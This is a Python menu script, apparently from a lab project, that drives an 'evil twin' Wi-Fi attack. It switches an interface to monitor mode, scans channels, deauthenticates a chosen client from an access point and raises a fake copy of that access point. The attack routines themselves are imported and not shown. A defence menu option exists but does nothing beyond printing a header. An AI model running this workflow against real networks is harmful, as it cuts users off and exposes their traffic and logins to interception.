import os
import sys
from colorama import Fore
import time
from datetime import datetime
import attack
import defence


def exit_and_cleanup(exit_code, message):
    print_regular('Perform cleanup')
    os.system('sudo sh Templates/cleanup.sh')
    sys.exit('{} Perform exit() with exit code {} , {}'.format(Fore.WHITE, exit_code, message))


def monitor_mode(interface: str) -> None:
    """
    Change the interface mode to monitor mode,
    This will used by sniffer interface to sniff the packets.
    for more information : Please enter
    https://linux.die.net/man/8/iwconfig
    """
    bash('ifconfig ' + interface + ' down')
    bash('iwconfig ' + interface + ' mode monitor')
    bash('ifconfig ' + interface + ' up')


def search(word: str, text: str):
    result = text.find(word)
    return result != -1


def bash(command: str):
    print('{} {} {}'.format(Fore.YELLOW, command, Fore.WHITE))
    return os.system(command)


def print_regular(message: str):
    print('{}{}'.format(Fore.WHITE, message))


def print_command(message: str):
    print('{}{}'.format(Fore.BLUE, message))


def print_errors(message: str):
    print('{}{}'.format(Fore.RED, message))


def print_header(message: str):
    print(Fore.WHITE)
    bash('figlet {}'.format(message))


def handle_user_result():
    return input('{}[1] Perform Evil Twin Attack\n'
                 '[2] Perform Defence on   Twin Attack \n'
                 'Please select one of the options mentioned above, or write quit to quit the manager\n'.format(
        Fore.BLUE))


def channel_changing(interface: str, timeout_seconds, channel: int = 1):
    """
    This function changing the channel searching. (to identify networks and clients that uses other channels)
    :param timeout_seconds: function timeout
    :param interface: the interface that used to identify the networks / clients. (wlan0 for example)
    :param channel: the starting channel default is 1.
    :return:
    """
    start_time = datetime.now()
    channel = channel
    while (datetime.now() - start_time).seconds < timeout_seconds:
        print('channel is {}'.format(channel))
        channel = (channel + 1) % 14
        bash('iwconfig {} channel {}'.format(interface, channel))
        time.sleep(1)


def start_defence_from_evil_attack():
    attack_obj = attack.Attack()
    ap_index = attack_obj.get_ap_index()
    defence_obj = defence.Defence(attack.get_ap(ap_index))
    defence_obj.display_problem(attack.ap_list)


def start_evil_twin_attack():
    attack_obj = attack.Attack()
    ap_index = attack_obj.get_ap_index()
    ap = attack.get_ap(ap_index)
    if ap is None:
        exit_and_cleanup(-1, '{}general error ap is None'.format(Fore.RED))
    print_regular('Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0], ap[1]))
    print_regular(
        'Searching for users in all channels on Network to Attack : AP Name = {}  MAC Address = {}\n'.format(ap[0],
                                                                                                             ap[1]))
    client_index = attack_obj.get_client_index(ap)
    client = attack.get_client(client_index)
    print_header('deauthentication attack')
    print_regular('Perform deauthentication attack on Client MAC Address = {} and AP Name = {}\n'.format(client, ap[1]))
    attack_obj.deauthentication_attack(client, ap[1])
    attack_obj.create_fake_access_point(ap[0])


def manage():
    print_header('Evil Twin Manager')
    print_command("Welcome To Evil Twin Manager")
    if os.geteuid():  # because scapy library must use root privileges.
        sys.exit('{}Perform exit() , Please run as root user , use sudo command , for more information please read '
                 'the README'.format(Fore.RED))

    while True:
        user_input = handle_user_result()
        if user_input == '1':
            start_evil_twin_attack()
            break
        elif user_input == '2':
            print_header('defence...')
            break
        elif user_input == 'quit':
            print_header('Bye Bye ...')
            exit(0)
        else:
            print_errors('Not a valid option please , Please try again.')


if __name__ == '__main__':
    manage()
